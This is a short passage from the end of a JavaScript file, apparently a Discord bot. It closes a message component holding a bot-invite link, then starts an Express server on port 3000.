              url: `https://discord.com/oauth2/authorize?client_id=1369365938847350794&permissions=8&redirect_uri=https%3A%2F%2Ff5c97a57-5945-4b06-bf77-d78233900787-00-1fs5de46gro5g.sisko.replit.dev%2F&integration_type=0&scope=bot`,
              emoji: emoji.add
            }
          ]
        }
      ]
    });
  }
});

// تشغيل الخادم
app.listen(3000, () => {
  console.log('Server is running on port 3000');
});